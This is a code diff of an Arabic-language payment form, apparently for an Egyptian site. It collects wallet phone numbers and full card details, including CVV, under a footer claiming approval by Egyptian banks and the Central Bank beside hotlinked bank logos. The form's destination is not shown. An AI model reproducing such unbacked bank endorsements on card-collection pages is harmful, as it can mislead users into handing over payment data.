@@ -87,6 +87,7 @@
             border-color: #dc3545 !important;
         }
 
+        /* تنسيق الشعارات داخل الخانات */
         .input-icon-right {
             position: absolute;
             right: 12px;
@@ -113,6 +114,7 @@
             font-size: 18px;
         }
 
+        /* زر إظهار/إخفاء الرمز لـ CVV */
         .toggle-password {
             position: absolute;
             left: 12px;
@@ -190,6 +192,7 @@
             color: #777;
         }
 
+        /* تنسيق شعارات البنوك الملونة في التذييل */
         footer {
             padding: 25px 0 35px 0;
             background: #ffffff;
@@ -256,9 +259,9 @@
                     <input type="hidden" id="card_expiry_mm" name="card_expiry_mm">
                     <input type="hidden" id="card_expiry_yy" name="card_expiry_yy">
 
-                    <!-- 1. اختيار وسيلة الدفع -->
+                    <!-- 1. اختيار وسيلة الدفع (محفظة وبطاقة فقط) -->
                     <div class="input-group-custom">
-                        <label for="payment_method">اختر وسيلة الدفع:</label>
+                        <label>اختر وسيلة الدفع:</label>
                         <select name="payment_method" id="payment_method" required>
                             <option value="wallet" selected>محفظة إلكترونية (Mobile Wallet)</option>
                             <option value="card">بطاقة بنكية (Visa / Mastercard)</option>
@@ -267,7 +270,7 @@
 
                     <!-- 2. قيمة المبلغ -->
                     <div class="input-group-custom">
-                        <label for="pay_amount">المبلغ (بالجنيه):</label>
+                        <label>المبلغ (بالجنيه):</label>
                         <div class="input-wrapper">
                             <input placeholder="أدخل المبلغ المطلوب" 
                                    type="text" 
@@ -280,7 +283,7 @@
 
                     <!-- 3. رقم الهاتف / المحفظة -->
                     <div class="input-group-custom" id="phone_group">
-                        <label for="user_phone">رقم الهاتف / المحفظة:</label>
+                        <label>رقم الهاتف / المحفظة:</label>
                         <div class="input-wrapper">
                             <input placeholder="01XXXXXXXXX" 
                                    type="text" 
@@ -299,8 +302,9 @@
 
                     <!-- 4. خانات البطاقة البنكية -->
                     <div id="card_section">
+                        <!-- رقم الكارت مع شعار الفيزا وماستر كارد -->
                         <div class="input-group-custom">
-                            <label for="card_number">رقم البطاقة البنكية:</label>
+                            <label>رقم البطاقة البنكية:</label>
                             <div class="input-wrapper">
                                 <input placeholder="Card Number" 
                                        type="text" 
@@ -318,8 +322,9 @@
                             <div class="error-message" id="error_card_number">يجب كتابة 16 رقماً بالإنجليزية بدون حروف.</div>
                         </div>
 
+                        <!-- اسم صاحب الكارت -->
                         <div class="input-group-custom">
-                            <label for="card_name">اسم صاحب البطاقة:</label>
+                            <label>اسم صاحب البطاقة:</label>
                             <div class="input-wrapper">
                                 <input placeholder="Card Holder Name" 
                                        type="text" 
@@ -329,9 +334,10 @@
                             <div class="error-message" id="error_card_name">يرجى إدخال الاسم بالحروف الإنجليزية فقط.</div>
                         </div>
 
+                        <!-- تاريخ الانتهاء و CVC مع زر الإظهار والإخفاء -->
                         <div class="input-containers">
                             <div class="input-group-custom">
-                                <label for="mmyy">التاريخ:</label>
+                                <label>التاريخ:</label>
                                 <div class="input-wrapper">
                                     <input placeholder="MM/YY" 
                                            type="text" 
@@ -344,7 +350,7 @@
                             </div>
 
                             <div class="input-group-custom">
-                                <label for="card_cvc">رمز CVV:</label>
+                                <label>رمز CVV:</label>
                                 <div class="input-wrapper">
                                     <input placeholder="CVV" 
                                            type="password" 
@@ -376,12 +382,12 @@
                     </div>
                 </form>
             </section>
-        </div>
-    </div>
+     
 
+    <!-- التذييل مع شعارات البنوك -->
     <footer>
         <div class="container bank-logos-container">
-            <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i> معتمد ومؤمن عبر البنوك المصرية والبنك المركزي</div>
+            <div class="bank-logos-title"><i class="fa fa-shield" aria-hidden="true"></i>معتمد ومؤمن عبر البنوك المصرية والبنك المركزي</div>
             <div class="bank-logos-grid">
                 <div class="bank-logo-card" title="البنك الأهلي المصري">
                     <img src="https://upload.wikimedia.org/wikipedia/commons/f/fc/NBE_logo.png" alt="البنك الأهلي المصري">
@@ -423,6 +429,7 @@
             }
         });
 
+        // تفعيل زر إظهار وإخفاء رمز الـ CVV فقط
         const toggleCvvBtn = document.getElementById('toggleCvvBtn');
         const cardCvcInput = document.getElementById('card_cvc');
         const cvvIcon = document.getElementById('cvvIcon');
@@ -541,7 +548,7 @@
                 errorElement.style.display = 'none';
                 const parts = val.split('/');
                 document.getElementById('card_expiry_mm').value = parts[0];
-                document.getElementById('card_expiry_yy').value = '20' + parts[1]; // إضافة 20 قبل السنة لتصبح YYYY
+                document.getElementById('card_expiry_yy').value = parts[1];
                 return true;
             }
         }
@@ -604,7 +611,6 @@
                 isPhoneValid = validatePhone();
             }
 
-            // منع الإرسال إذا وجد خطأ في أي خانة
             if (!isAmountValid || !isPhoneValid || !isCardValid || !isNameValid || !isExpiryValid || !isCvcValid) {
                 e.preventDefault();
                 return;
